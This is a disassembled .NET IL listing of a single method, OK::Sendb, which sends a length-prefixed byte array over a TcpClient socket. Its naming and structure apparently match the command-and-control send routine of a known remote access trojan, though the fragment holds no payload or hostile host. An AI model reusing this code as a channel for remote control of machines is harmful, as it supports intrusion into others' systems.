  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       202 (0xca)
    .maxstack  5
    .locals init (bool V_0,
             uint8[] V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.IO.FileInfo V_5,
             int32 V_6,
             string V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_0009

    IL_0007:  ldc.i4.0
    IL_0008:  ret

    .try
    {
      IL_0009:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_000e:  stloc.s    V_5
      IL_0010:  ldloc.s    V_5
      IL_0012:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0017:  ldsfld     bool j.OK::Cn
        IL_001c:  brtrue.s   IL_0025

        IL_001e:  ldc.i4.0
        IL_001f:  stloc.0
        IL_0020:  leave      IL_00c8

        IL_0025:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002a:  stloc.2
        IL_002b:  ldarg.0
        IL_002c:  ldlen
        IL_002d:  conv.ovf.i4
        IL_002e:  stloc.s    V_6
        IL_0030:  ldloca.s   V_6
        IL_0032:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0037:  ldstr      bytearray (00 00 ) 
        IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0041:  stloc.s    V_7
        IL_0043:  ldloca.s   V_7
        IL_0045:  call       uint8[] j.OK::SB(string&)
        IL_004a:  stloc.1
        IL_004b:  ldloc.2
        IL_004c:  ldloc.1
        IL_004d:  ldc.i4.0
        IL_004e:  ldloc.1
        IL_004f:  ldlen
        IL_0050:  conv.ovf.i4
        IL_0051:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0056:  ldloc.2
        IL_0057:  ldarg.0
        IL_0058:  ldc.i4.0
        IL_0059:  ldarg.0
        IL_005a:  ldlen
        IL_005b:  conv.ovf.i4
        IL_005c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0061:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0066:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_006b:  ldloc.2
        IL_006c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0071:  ldc.i4.0
        IL_0072:  ldloc.2
        IL_0073:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0078:  conv.ovf.i4
        IL_0079:  ldc.i4.0
        IL_007a:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_007f:  pop
        IL_0080:  leave.s    IL_00c2

      }  // end .try
      finally
      {
        IL_0082:  ldloc.s    V_5
        IL_0084:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0089:  endfinally
      }  // end handler
      IL_008a:  leave.s    IL_00c2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008c:  dup
      IL_008d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0092:  stloc.3
      .try
      {
        IL_0093:  ldsfld     bool j.OK::Cn
        IL_0098:  brfalse.s  IL_00aa

        IL_009a:  ldc.i4.0
        IL_009b:  stsfld     bool j.OK::Cn
        IL_00a0:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00a5:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00aa:  leave.s    IL_00bb

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00ac:  dup
        IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00b2:  stloc.s    V_4
        IL_00b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b9:  leave.s    IL_00bb

      }  // end handler
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c0:  leave.s    IL_00c2

    }  // end handler
    IL_00c2:  ldsfld     bool j.OK::Cn
    IL_00c7:  ret

    IL_00c8:  ldloc.0
    IL_00c9:  ret
  } // end of method OK::Sendb
